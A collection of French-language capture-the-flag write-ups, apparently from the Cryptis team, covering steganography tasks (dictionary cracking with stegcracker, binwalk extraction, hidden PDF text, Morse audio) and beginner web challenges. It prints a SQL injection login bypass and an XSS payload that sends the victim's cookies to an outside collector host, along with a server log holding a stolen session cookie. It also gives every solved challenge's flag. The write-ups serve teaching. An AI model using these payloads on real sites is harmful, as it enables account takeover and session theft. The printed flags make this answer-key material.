* Une **WordList** est un fichier texte représentant un dictionnaire de mot de passe connu, probable ou même ciblé à la personne après l'étude de cette dernière. Elle permet de faire des attaques de mots de passe avec l'utilisation de cette liste afin d'éviter une fastidieuse et/ou infructueuse attaque par force brute.
* **Stegcracker** est un simple outil de brute force sur une image *stéganographiée* pouvant utiliser une WordList.
* Le mot de passe étant assez simple à cracker, il suffit d'employer une attaque par dictionnaire
  * Wordslist utilisé : rockyou.txt
  * Outil de crack : stegcracker

```bash
# Lancement du crack
$ stegcracker biscuit.jpg rockyou.txt 
StegCracker - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2019 - Luke Paris (Paradoxis)

Attacking file 'biscuit.jpg' with wordlist 'rockyou.txt'..
Successfully cracked file with password: strawberries
Your file has been written to: biscuit.jpg.out
# Lecture du fichier généré par le succès du crack
$ strings biscuit.jpg.out
CRYPTIS{cR4çk3r_b15cUi7}
```

`CRYPTIS{cR4çk3r_b15cUi7}`

# stega_300_extraction

------

### Titre : Extraction

### Points : 300

------

### Description

------

Nous avons intercepté ce fichier file. L'image pourrait nous mener sur la piste ...

------

### Réalisation

------

* On commence par mettre le flag dans un fichier .txt.

```bash
$ echo "CRYPTIS{3xTr@cti0n_f1cH13r}" > flag.txt
```

* Compression et modification de ce fichier

```bash
$ mv flag.txt.zip extraction.zip
$ rm flag.txt
```

* On dispose d'une image `extraction.jpg`. 
* On va cacher le fichier ZIP dans l'image

```bash
$ cat extraction.zip >> extraction.jpg
$ rm extraction.zip
```



------

### Résolution

------

* On se retrouve avec une image d'extraction. On peut penser à une extraction de données.

* Après inspection avec la commande `file`, on ne trouve rien d'intéressant.

```bash
$ file extraction.jpg 
extraction.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=1, copyright=Anthony.thomas-trophime\302\251cellule de production image terre de Lyon/Arm\303\251e de terre], baseline, precision 8, 800x533, frames 3
```

* Cependant la commande `strings` nous affiche un fichier `flag.txt` qui serait contenu vraisemblablement dans l'image.

```bash
$ strings extraction.jpg | grep "CRYP"
# Aucun affichage
$ strings extraction.jpg | grep "flag"
flag.txtUT
flag.txtUT
```

* On va donc utiliser la commande *binwalk* : on obtient un dossier contenant le flag.
  * *Binwalk est un outil linux permettant d’analyser des fichiers binaires pouvant contenir des fichiers incorporés et/ou du code exécutable.*

```bash
$ binwalk -e extraction.jpg
$ ls
extraction.jpg  _extraction.jpg.extracted
$ ls _extraction.jpg.extracted
928E.zip  flag.txt
$ cat _extraction.jpg.extracted/flag.txt 
CRYPTIS{3xTr@cti0n_f1cH13r}
```

`CRYPTIS{3xTr@cti0n_f1cH13r}`

# stega_0300_read_me_2

------

### Titre : Read me 2

### Points : 300

------

### Description

------

Do you have the time to read me ?

------

### Réalisation

------

Le but de ce challenge est d'introduire une méthode de stéganographie permettant de cacher des informations dans un document.

Pour réaliser ce challenge, nous avons créé un document PDF avec un texte quelconque. Nous avons caché le flag en mettant les lettres de celui-ci en blanc à la fin de certaines lignes du texte. Ainsi lorsqu'on ouvre le fichier nous ne voyons pas le flag puisqu'il se confond avec la couleur du fond. 

------

### Résolution

------

Pour résoudre ce challenge il y a deux solutions. La première est de sélectionner tout le document, ainsi on pourra apercevoir les lettres qui constituent le flag à la fin de certaines lignes. La seconde solution est d'utiliser la commande `pdftotext` qui permet d'extraire le texte d'un pdf. 

*Petit bonus: `pdftotext wh1ter0se.pdf - | cut -d '.' -f3 | tr -d ' \n'` cette commande permet d'avoir le flag en une seule ligne, prêt à être validé :wink:*

`CRYPTIS{D4RK_4RMY}`



# stega_0400_samuel

---

### Titre : Samuel.-

### Points : 400

---

### Description

---

Notre ami Samuel nous a envoyé un fichier audio. Découvrez ce qu'il vous a dit. 

Veuillez entrer la réponse sous la forme : CRYPTIS{réponse}.

---

### Réalisation

---

On utilise simplement ce site http://www.meridianoutpost.com/resources/etools/calculators/calculator-morse-code.php où l'on renseigne son texte a convertir en morse dans un fichier audio.

---

### Résolution

On se retrouve avec un fichier audio que l'on peut ouvrir avec audacity par exemple.

Si l'on ecoute bien le son on peut reconnaitre du code Morse qui peut etre vu aussi en activant le spectogramme du son.

On utilise ce site https://morsecode.scphillips.com/labs/audio-decoder-adaptive/ qui va lire le fichier audio et dechiffrer le Morse pour nous.

On obtient :

`M0RS31SG00D`

`CRYPTIS{M0RS31SG00D}`

# stega_0600_jacquouille_la_fripouille

------

### Titre : Jacquouille la fripouille

### Points : 600

------

### Description

------

Jacquoille et le lsb...

------

### Réalisation

------

//TODO

------

### Résolution

------

//TODO

`CRYPTIS{lsb_is_easy}`

# web_0050_the_beginning

---

### Titre : The_Beginning

### Points : 50

---

### Description

---

Really need description?

---

### Réalisation

---

Bah on fait un formulaire http qui renvoie le flag si on a bien isadmin dans les données du post sinon non xD 

---

### Résolution

---

Le plus simple ouvrir un débuggeur html si navigateur et de retirer disabled du checkbot. 
Ensuite on clic sur le bouton et on met comme user & password 'admin', car c'est le meilleur login au monde et pour finir submit.


```bash
$ curl localhost:50041/ -d "user=admin&password=admin&isadmin=on"
CRYPTIS{W04h_Y0u_Ar3_S0_Str0ng}
```

`CRYPTIS{W04h_Y0u_Ar3_S0_Str0ng}`

# web_0050_the_beginning_su1t3

---

### Titre : The_Beginning_su1t3

### Points : 50

---

### Description

---

1 oeuf  
85g de Beurre  
85g de Sucre  
100g de pépites de chocolat  
150g de farine  
1 cuillère de levure  
1 cuillère de Sel  
1 sachet de Sucre vanillé  

---

### Réalisation

---

Voir script.py

Pour faire simple : on va définir un cookie à flag a false 
    Si on le passe à true on va ensuite envoyer le flag.... 

---

### Résolution

---

```bash
$ curl "http://localhost:50043/" -v 
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 50043 (#0)
> GET / HTTP/1.1
> Host: localhost:50043
> User-Agent: curl/7.58.0
> Accept: */*
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: BaseHTTP/0.6 Python/3.6.8
< Date: Mon, 23 Sep 2019 12:41:28 GMT
< Content-type: text/html
< Set-Cookie:  flag=false
< 
* Closing connection 0
<img src='https://media.giphy.com/media/abOlz9ygIm9Es/source.gif'>
$ curl "http://localhost:50043/" --cookie "flag=true" -v
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 50043 (#0)
> GET / HTTP/1.1
> Host: localhost:50043
> User-Agent: curl/7.58.0
> Accept: */*
> Cookie: flag=true
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: BaseHTTP/0.6 Python/3.6.8
< Date: Mon, 23 Sep 2019 12:41:49 GMT
< Content-type: text/html
< Set-Cookie:  flag="CRYPTIS{C0ok13s_M14m_M14m_M14m}"
< 
* Closing connection 0
<img src='https://media.giphy.com/media/abOlz9ygIm9Es/source.gif'>
```

`CRYPTIS{C0ok13s_M14m_M14m_M14m}`

# web_0250_r2d2

---

### Titre : R2d2

### Points : 250

---

### Description

---

Find the flag.

---

### Réalisation

---

Le but de ce challenge est d'apprendre l'existence des fichiers robots.txt qui peuvent nous apprendre plein de choses intéressant.  
On va aussi devoir utilisé un user-agent pour récuperer le bon fichier.  

---

### Résolution

---

Le titre du challenge nous donne déjà une bonne piste R2d2 => Robots.txt

```bash
curl http://ctf.teamcryptis.fr:50040/robots.txt
User-agent: *
Disallow:
```

Mais on n'a pas le flag... Le problème vient du fait qu'on n'a pas d'user-agent, ou qu'il n'est pas celui d'un robot de moteur de recherche.

```bash
$ curl http://ctf.teamcryptis.fr:50040/robots.txt --user-agent 'Googlebot'
<html><head><title>R0bOTs?</title></head>Oh, I don't like Google soryyy =).</body></html>
```
Ah le robot de google n'est peut-être pas le bon, on va en essayer un autre :

```bash
$ curl http://ctf.teamcryptis.fr:50040/robots.txt --user-agent 'DuckDuckBot'
<html><head><title>R0bOTs?</title></head>
User-agent: *
Disallow: /CRYPTIS{I_h4t3_R0b0t3}
</body></html>
```

`CRYPTIS{I_h4t3_R0b0t3}`

# web_0400_sql_login

---

### Titre : SQL_Login

### Points : 200

---

### Description

---

Your mission : get admin access.

http://ctf.teamcryptis.fr:50044/

---

### Réalisation

---

Le but ici d'est d'initier les participants avec les injections SQL.

---

### Résolution

---

Avec le titre du challenge on a déjà un bonne indice : injection SQL.  
On va donc essayer la payload la plus simple : `'or 1=1 -- `
et bingo on a le flag 

```bash
$ curl 'http://ctf.teamcryptis.fr:50044/login.php' -d "username=admin&password=' or 1=1 -- "
CRYPTIS{Pl34s3_b3_c4r3fuL_w1th_sql}!
```

`CRYPTIS{Pl34s3_b3_c4r3fuL_w1th_sql}`


# web_0200_extra_toxics_script

---

### Titre : eXtra toXics Script

### Points : 600

---

### Description

---

I think the future forum of cryptis is sure. You can send message to admin, and he will check your secret message ;-).

http://ctf.teamcryptis.fr:50045/

---

### Réalisation

---

On va utiliser PhantomJs pour simuler la lecture des messages par un admin. Lorsqu'un utilisateur clique sur le bouton check admin
Le robots va charger la page avec le message de l'utilisateur.

Le but pour ce challenge : découvrir les XSS ( ps : je me suis fail dans le titre ^^') et préparer les futurs challenges xss avec des filtres ...

---

### Résolution

---

Le titre est presqu'un indice : xxs ^^'
On va donc se renseigner sur les failles XSS et comment les exploiter : 
Pour cela on va avoir besoin d'une serveur / service qui va permet de récuperer le flag & d'une payload
Le challenge ici ne possède aucun filtre, donc n'importe qu'elle payload fait l'affaire :

`<script>document.location='http://ip:port/?c='+document.cookie;</script>`

(
    une autre payload pr ceux qui changait de page sans pouvoir cliquer avant :
    `<script>document.write('<img src=\'http://ip:port/?cookie='+document.cookie+'\'\>admin</img>');</script>`
)


sur le serveur : 
```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
92.88.224.141 - - [28/Sep/2019 16:47:08] "GET /?cookie=PHPSESSID=sq72hgpslcduatplu6js05dn3i HTTP/1.1" 200 -
51.159.5.184 - - [28/Sep/2019 16:47:11] "GET /?cookie=flag=CRYPTIS%7BCr0sS_s1t3_scr1pt1ng_b3g1nn1ng%7D;%20id=91;%20uid=sq72hgpslcduatplu6js05dn3i HTTP/1.1" 200 -
```

`CRYPTIS{Cr0sS_s1t3_scr1pt1ng_b3g1nn1ng}`
